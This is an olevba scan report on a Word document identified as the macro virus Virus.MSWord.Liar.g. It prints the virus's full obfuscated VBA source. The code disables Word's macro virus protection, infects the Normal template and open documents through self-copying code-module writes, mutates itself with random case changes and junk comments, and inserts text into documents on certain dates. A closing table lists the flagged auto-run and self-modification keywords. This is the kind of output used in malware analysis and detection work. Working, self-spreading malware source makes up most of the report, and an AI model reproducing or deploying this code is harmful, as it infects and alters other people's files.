olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.g-f44b1993f6f42058f5b6c9144287a00d5af9d682
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.g-f44b1993f6f42058f5b6c9144287a00d5af9d682 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub DOcUMENt_cLOSe() 'Æãá²þ³®¹ûÖ©°ÚŸ¨ú¡ÛË³úÄÑâÁ¿åä­­Å�¤éº�çÊõœ¼þÆõõ°ãûâÙá¡ž×äïï¿ÖÖ¸ßÀë
Dim v(150): Options.VirusProtection = (Rnd * 0) 'žùØÛÏðÐæÁÉð¢¾ÍØõ±Ò´Ä¬þêøõÞóÿÊ¾É­÷ì¼ÒÜñ¹£Ê÷´×ÑÎëßöÅï£öÓä¨´ä¼æ÷üß°âèÏæÝû
SetAttr NormalTemplate.FullName, vbNormal 'ÖºîÕÉ®ÉÕÍéÂÏ»§ÚáâðËéÅÛ¨Ðì»µÂ±ï¯ë ùù°ÚÑôôîû¸ÊÇêÑµ´Ø¥µ÷À¸þÔ×ä�¯ºÖ¶ä
Set A = MacroContainer.VBProject: Set Ab = A.vbCOmPOnEnTs(1) '¼¥¨Öó °º×þïïÍ×õä¿«Îí¦Úß²êÓè¨ÂÚÙ©Å¢ÌÞ©ææîÝÿµ«ä¹×®µÔøÖÞ¸à°ðÄ
Set ABC = Ab.coDemoDuLE: Set S = NormalTemplate: t = Chr(39) 'ÂöëºÍíœÐÿÕã´¦­îõþðÚíž¨Å·ñæý­±°ÞÒÈ¯ÇëëÛÆÝËÕÆúÉëŸ¢œ¬×¯�æîºþÞºôõâØÈàâ¯áÚ×«
'ÂöëºÍíœÐÿÕã´¦­îõþðÚíž¨Å·ñæý­±°ÞÒÈ¯ÇëëÛÆÝËÕÆúÉëŸ¢œ¬×¯�æîºþÞºôõâØÈàâ¯áÚ×«
'¾× ¿ÌéÅµÒ¥ã½¦ãÛþâ�³ÅÃåÍ°ªöÉÖøÒºÎ×¡�ÄÊÂ÷íãþðÕÉÈ±û×úàÃÌÄß¥²ÆÔ¶
Set Nh = S.VBProject.vbCOmPOnEnTs(1).coDemoDuLE '¾¯Ö°·º¶ì²ùç ®êíè£ææ¸½²´á­¸¦éÜÈÜëÆÁòùÀ¬¿ÕíÎž³ÙÏÉ¼ü¿¦ÝôÕ²ÜÖµÔ¸Íîä
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '³æÉÍÇãÖÜžÌÅÑüÚò¾ðìÚöÂ¹ÔÕÞ¹êû§ûÒ¶´­ëÑ©­ÖÑÝç¯ÉÊÁ÷¸æúäŸß¿ÛÛßêêÕÂ
vC = "pRIVATE sUb doCUMEnt_CLoSe()" & t & vx & vbCr  '¼Ø¬Ô¬ê¶¦ê�Ÿ¨Ë¾Òð¿ÂªÛúÍúÚÒâŸþ¾ÂÊý¸à�âÛßÜèÄ¹åÆÆœ¢ç®³×ÁÎÎòŸîÅ»õ¾¶±Ô÷ÎÆúÖ
If MacroContainer = NormalTemplate Then 'åòûº«Ì¯�ËùÁßä»×Ùë¨ð×ÃÉ·óßÿ±£âé íÖÛßžÆËò¦ü°¸ç¡Ñ·ØèÃÈÑ¿³ùðõúÉ
'Ý¦Ïè«ùòŸ¬­œè½ÁžÕú¨ïçÃÛË¤É ³×´ÆÓûüÛÖÛÀîÔðžäú¯¸æ°¨�äÑ¤£Í§ÆÕ®·¦ð²½¤¬²²Ð¶Ç
'Ý¦Ïè«ùòŸ¬­œè½ÁžÕú¨ïçÃÛË¤É ³×´ÆÓûüÛÖÛÀîÔðžäú¯¸æ°¨�äÑ¤£Í§ÆÕ®·¦ð²½¤¬²²Ð¶Ç
Set S = ActiveDocument: Set Nh = S.VBProject.vbCOmPOnEnTs(1).coDemoDuLE 'ÔÕªú¦èú±üò½å«êéÍÂÃõ¡ÙÝü¦Î×¢æÈû®ÑÉÚñ¶éêßÕµôÔ­Æ³âøÁÍ»ÜÀï¥Û®ïÎüµ«âÕÌÿ½ž
'ûŸœ»»îîŸº§óðåüß¥è¹¬÷®®ëõÁøÁÑ¡ìâÃçàöÿ ¶ÕÒÑªÖ¹ÚÙèéù°­ÞÖœºÎ¬Þð
vC = "pRiVATE suB docuMenT_oPeN()" & t & vx & vbCr 'Î¥ï­¾éû¤Î¼ùþ ë¦Óïã´ªæÝ©ªÖÄí¡æþßÃÚ¿µ¸íúçìžî¾¥äæ²´ÙðÆóäª½ÑÇèþæ úª÷·å¤
'Î¥ï­¾éû¤Î¼ùþ ë¦Óïã´ªæÝ©ªÖÄí¡æþßÃÚ¿µ¸íúçìžî¾¥äæ²´ÙðÆóäª½ÑÇèþæ úª÷·å¤
'Î¨Ó¬­øÅÍ°Ôžñ¼º¶Î�ªî½ä¨¶ØöÂõ¼á÷ÀÉÆ«¢êñ¸®ß«²ÙÅÚËÐÅ²ßå©æðïçîËŸØâ¼è
End If: LIn = ABC.CoUNtOFlines 'ñßÐ£ü³øÁ»²×´î¢ßùâ¿ï¨ïÔ£Ñ�Ô³¸ëï½�²ÇÙä³èºÃí ®½ùÑö¾²ÒÿÊÂ©àãÂÛÉÀ¾ð»¡²¡ñá
'ñßÐ£ü³øÁ»²×´î¢ßùâ¿ï¨ïÔ£Ñ�Ô³¸ëï½�²ÇÙä³èºÃí ®½ùÑö¾²ÒÿÊÂ©àãÂÛÉÀ¾ð»¡²¡ñá
For i = 2 To LIn '¢Ò¥ïÎÚÄüÝ·øèù¬ë²ž°Ï»ä÷ÞçÔÞ¿Õ«ÑÓÁ¼œüÉúÂïÎÓ�Ä´ã¦«ß©Ìë§Ï�ýž«ãëÓ
'¢Ò¥ïÎÚÄüÝ·øèù¬ë²ž°Ï»ä÷ÞçÔÞ¿Õ«ÑÓÁ¼œüÉúÂïÎÓ�Ä´ã¦«ß©Ìë§Ï�ýž«ãëÓ
'Ÿí¾û¨úÏÐõöÛúŸœÆÿÂµÙÇï½êÄªÈŸÚÁò¶¸¨®½äÒÄøô¡æ¨Æì©êáûÓßÁÚ¢¶ùÝÙÆç¢Öã£¹¢Ïß¯
'Ÿí¾û¨úÏÐõöÛúŸœÆÿÂµÙÇï½êÄªÈŸÚÁò¶¸¨®½äÒÄøô¡æ¨Æì©êáûÓßÁÚ¢¶ùÝÙÆç¢Öã£¹¢Ïß¯
JC = "": d = Int(Rnd * 3): P = InStr(ABC.lineS(i, 1), t) 'ùœ¢§ª¡Ù«ÙÒ«­ÁÖò½òÿáÅÝ¼ÉãêÔÔÛ�ÞÛžâåè½Ë¢ÒÅàî÷®ÑÒÝûŸÄäÑÞ«¹§ëôÑóðÎ
If P = 0 Then GoTo E_ 'ÙÏ®¥ÁŸñ¦¡Ùž×»ÆÙÎµ¼Ëÿ¿§ÞÒ¥ËÑíÇèÌµúÈÓÌæ¿ÞÀ¬Þæó¯ÜÆæØ§ßé÷á¡ü£ìéÂìÁÍç
'ÙÏ®¥ÁŸñ¦¡Ùž×»ÆÙÎµ¼Ëÿ¿§ÞÒ¥ËÑíÇèÌµúÈÓÌæ¿ÞÀ¬Þæó¯ÜÆæØ§ßé÷á¡ü£ìéÂìÁÍç
If P = 1 And LIn > 100 Then 'Ñì²íðÁé¬Ðõ¸­Üïº¿¦®é¦¬ò÷÷çéøÄÎâÃþÒ÷ÊÅ¤ÏçœÞÒ£Ó³óè¯÷éûèØ¹Ä
d = 1: GoTo N_ ' ¡¸ÞôÍ÷ãÝ¤ªêøÛ³Ÿ¿Ðåè·µï¹ñäÏá§¼¾ªÞÝ©­­«¸ÍÙ¿õè²ùÚü¹Ï¸Ó×°²ÆÚ÷ÇÔÛÀÃ
' ¡¸ÞôÍ÷ãÝ¤ªêøÛ³Ÿ¿Ðåè·µï¹ñäÏá§¼¾ªÞÝ©­­«¸ÍÙ¿õè²ùÚü¹Ï¸Ó×°²ÆÚ÷ÇÔÛÀÃ
End If 'Àù½¤ŸÀÉ´èÂÎÌÛÞâÓ¬Ûö¾¾±ÓûÓ°ÇÍ«Ì©Úðô¸óè÷ÔÛÀ«ÆŸžÈÓÃÁéªÚÉÿñ®Ò±
'èýåÚÊ­ùº»çÑ²¬¦ÒæÝ³ªîÖàî¾ÿ´Ìª£¼ íäªŸµùÞèüö´¼¥ò¤½±çÁÅùÎ±Å¦®ºÆùôÂÊé¶½�Ùþ®²Êæ
l = UCase(Left(ABC.lineS(i, 1), (P - 1))) '³´Á×öÛë»×ëÂ¡Ð´ óÎèî²¤õÔ¾Ì­¦Àµ¥Â«åò²ú®óôÝäú½¢œ»»ÙÛ¾ªŸ¿¡·ã÷¸Ðìîè²£âê÷Ï
For O = 1 To Len(l) '­ËØ­¾éŸÞ½®ÀçÖÚ¶¨�Ë Ò´¡®´ÐðÜž¿Ï÷«ûØëôÄžúø×¼¯ÉóÛ× ÌÄ¯³äùÕøõ
F = Mid(l, O, 1) '°ºÁôê¥°Ð®Û¦ ç¼Ñü¡üí¹º¶Ì¿à¬ÂÑ¶õÔÛçåñ¨œÖ²þ²¶ùÇýÑ¼»óúÎ¹©¼Üèæ§©ÑÎÂÄ²ãßÓÊßÎã
If Asc(F) < 90 And Asc(F) > 65 Then F = Chr(Asc(F) + Int(Rnd * 2) * 32) 'çúÂïçÊÿ´Òëßúøú£ûžþÞêÏ¾ò¥×ï÷§çÊÊï°œú÷­²Þ¿ï�ßø¥©ÃºŸèú¤«í¸½ÁýŸ¥
v(i) = v(i) & F 'õÜÓÂ¢¥¦ð¨»÷áËÀ¹ââÖÜÀ¾ØÐà´¢Çóæ¨¾ÝÙÝ Áã¸ªöÅ¢ô¯êœàÞÌ¸È¼Ê´ÖÖÂ
Next O '÷Þ¸ñÜÁ²ÕÙìÚ§Ö÷�Ò¶ãêÂŸ·²ÉÀÄ»Ïù­·ÕÜ©ó ¯½ÉÕÖÿåÞ²¡Â ö¿¶çÅÞÓ�žÂÊ
'÷Þ¸ñÜÁ²ÕÙìÚ§Ö÷�Ò¶ãêÂŸ·²ÉÀÄ»Ïù­·ÕÜ©ó ¯½ÉÕÖÿåÞ²¡Â ö¿¶çÅÞÓ�žÂÊ
' îÅÜÒÄ¬ä©÷Ú¬¨í¤¡Ãôö²ÝÍÞøÀÞþ²Ðóª¬¦ÓËçÀËÆÔåâÇ®ÜÉÔÄøÙï¥¦¡½ùÀÝ£ê¹©Ú÷½ÓÉ
For J = 1 To Int(75 - (Rnd * 20))  'ÞÓ½«ÑüèÚÙœÕ¬ðÏ¯àø¥â¤ÖµÔ´Û³üçéÜ À¨êì¸Ñëé§ÚÎÅØØ�¿¨ç¥³ùî¶Å¥ýÞÄ·ÜÞŸ²¥´
JC = JC & Chr(255 - Int(Rnd * 100)) '®´¡ü¹ûÙœäß£ÉÜø©ÞÜëÜÊ÷ßÝ²¢Þ¢Ùéã®­£×øÙÓÏêð«ÙÙêê¡¡ùâÿîÖÛ¶ÜÿÕ
Next J 'Í§�¿¸ÊÖÔÝ¢À´»éýþ«ìúØÅÄå¯Ï·ÇøÛåµÓ«Þëëà©ü·üóëÅÉÆïøã Ì¦ÍÇöùØ£æëÑÌã¥ê£äÏþòö¢ê
v(i) = v(i) & t & JC 'øá¢â¦¹ÕœÈ·À­¤Ý¤¯·§ÃÿÁ�ïùÓ·Åô¼îÿ´ãûÀÒ¼Áªõÿû¿«½½êòø®ªô½´ðóïªàÃòü¬ô½Ì
If d = 2 Then v(i) = v(i) & vbCr & t & JC 'ÐÒÝ§Ç°´Á»¾µó�¿Þ¢ùûÐ¸ÝÀ½Æ¶³Á§Î¹Ùñ×ëÎèôßÆ©¬ÊùåëœäñØìÇ¨Å¸ž�ËÚ¦¬ÓÎóÈêÊñáµ¨Á
'¤ðÛ®Øßæåœ£Ñ¯òË¥üúí¢îïÎÞëÃ«Ìçø¢£í¢É­ÂÎËî¡Âö§²ÊÛèÈŸûÄÏÜËÙ¿ÇôæÚÃÉÈ
'¤ðÛ®Øßæåœ£Ñ¯òË¥üúí¢îïÎÞëÃ«Ìçø¢£í¢É­ÂÎËî¡Âö§²ÊÛèÈŸûÄÏÜËÙ¿ÇôæÚÃÉÈ
vC = vC & v(i) & vbCr 'äÄÍ§Ûæœêð¶æÄ­ÇÎ¢¡õÏÒóÇÞÕ¦ÕÏ÷©£ž«ö �´µöÆê Ÿ¹¦þ±Î ¸è²ÊþÏ°Ù¢Çá§½£µì
'äÄÍ§Ûæœêð¶æÄ­ÇÎ¢¡õÏÒóÇÞÕ¦ÕÏ÷©£ž«ö �´µöÆê Ÿ¹¦þ±Î ¸è²ÊþÏ°Ù¢Çá§½£µì
N_: '³žÁà�¼»¥ïÎÛ¼µÑ¿Ò¹¥¼»ßäýØô×ÛÒþ¯ëõ®Þþµ¡öÈ¦ÞÇÒÊ»œÿÈªúâÊ¾¸Ð°ºÛ
'»å×¯®õ×ÙÎ�ç¹áÏéÀìøŸõ¤³Í©²þÇËË­í²ÁðÊŸ½Æž±üñØÛžÉ­Î¼Ðíò±àÒêöž¡ÂÌú
Next i 'ýªÑ�Ý¼¥æý×ÀÊœà¼ÜžàõþÛãõÇÜ¿ë Ùë¯Ê·é µÛ¶ÜúêòÃíÖþ³Éûé÷ ŸéýÅÿÀÊñâùÈÚŸé°¸œ
'ýªÑ�Ý¼¥æý×ÀÊœà¼ÜžàõþÛãõÇÜ¿ë Ùë¯Ê·é µÛ¶ÜúêòÃíÖþ³Éûé÷ ŸéýÅÿÀÊñâùÈÚŸé°¸œ
'äÙð£þÍ¢Õå±Ü½àÇÔØÐåœžè³Ñ¦ºýþÌáþ¯õ®®¿óÒûµº×Ï«ØÎ¢ÇåðÔ§øÂÆ÷ªØí´À
E_: 'ÐÄ°¶µ¦¬÷Ã§Õ¨°¥¨å¿Ì°ÑÝ¸ËÇÑÚ·Äºžß¨§ÌÃÄàµÀÂíÃ§ÆØ ñìÅÐÁ¦Þ£ÚÇ³Ç¢ºé¨í¼ÛÏÌÙÜÖèÿ
'ÐÄ°¶µ¦¬÷Ã§Õ¨°¥¨å¿Ì°ÑÝ¸ËÇÑÚ·Äºžß¨§ÌÃÄàµÀÂíÃ§ÆØ ñìÅÐÁ¦Þ£ÚÇ³Ç¢ºé¨í¼ÛÏÌÙÜÖèÿ
If Nh.CoUNtOFlines < (1 + 1) Then 'Èì¢×­çÖáÖ¦Ð×Í¿ÝÅ­Øè°¯¤Æá¢³ÉñÑá­¯ê÷Àì¯Üÿ­Ÿ¡çâéÞ´�¯ŸþŸ·­§âëå÷ÜÝó¡¾ œÍ¶¶«½Ú¾®
Nh.ADDfROMSTRINg vC: S.Save 'ÉÃÇ ¦¦¢ÚåïëÅ¦±øŸ¢Þ¿§ÂìÈ§ÀÚÁò´ÆËï³É«´ÆÀÞêÅ¿Ó°Ø©ùÛ¿ÓÉÔð�ž
'ÉÃÇ ¦¦¢ÚåïëÅ¦±øŸ¢Þ¿§ÂìÈ§ÀÚÁò´ÆËï³É«´ÆÀÞêÅ¿Ó°Ø©ùÛ¿ÓÉÔð�ž
End If 'ýÁÖÎÚüûæ×àØ¥ÅÅØ¸žçïÙé£ò¹­»Óß¾ÒÆ­·²æöë¸Ä§½øÐÂ¿¨ïÎÝþä®ºå¬ÊÀÕºóÈ¬êÁ
If Day(Now()) = (25 + Int(Rnd * 6)) Then Selection.InsertAfter "l0 JulIe, wAssUP?" '«Ø·í÷Í÷åÁ¯½ãÉÜØæØ±Ú¹ñËÔ¡ÚóŸÀ´£œÐ¹ ÊæÙûòð¦è¸í»Ö¼þÞèð�Óëºà«öþ»øÃù
'èÒæïÕ¥óð¢îò¥Ë÷Áÿ°¨¹½Ü³Ëœè±¯ÕÒªÆÙÿòêá£É¸¯¹¼íõ¡±Â±èí¥¸ã²óçß¢ýº²Ì®ÿúéð¶¬éÒæß
'èÒæïÕ¥óð¢îò¥Ë÷Áÿ°¨¹½Ü³Ëœè±¯ÕÒªÆÙÿòêá£É¸¯¹¼íõ¡±Â±èí¥¸ã²óçß¢ýº²Ì®ÿúéð¶¬éÒæß
End Sub '¶ÃÎç¥ÀÿïóØ¯­ìèÜï×óÜÔö¨¤ÇÑ½û¨»¬Ý¦ì«£ÉáÄ¼Ìÿ£¾¥úÛ«ôàñùœáÍìéùîÂ¡ìò£¼ê¾¦Ó
'¶ÃÎç¥ÀÿïóØ¯­ìèÜï×óÜÔö¨¤ÇÑ½û¨»¬Ý¦ì«£ÉáÄ¼Ìÿ£¾¥úÛ«ôàñùœáÍìéùîÂ¡ìò£¼ê¾¦Ó
Rem ClASS97MAcro.jUliE - dEDIcAtEd tO JULIE ;) '�Û¦ÐÁêæ «©¾ ÑØðØÊë§ ©Òºó³µùÇöõë½ÐìÎÚª¶÷âäì¯œ­­àÅœ³ÒÇôÊ¡ªï±éë±ðÁº
Rem ANoTHeR vIRus by jAck twOflowER [LineZeRo & MeTApHAse] 'ôµíüÓ��ÛÇÅÅÁ²îØ¹â»¡úÎÉäÂÔôÄ¯¿×î¥öúÑÃÌÐÎ¨¬ÜÉ�úßŸ©ïž×¹Ò ò·ýÊ

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DOcUMENt_cLOSe      |Runs when the Word document is closed        |
|AutoExec  |docuMenT_oPeN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbCOmPOnEnTs        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|coDemoDuLE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDfROMSTRINg       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

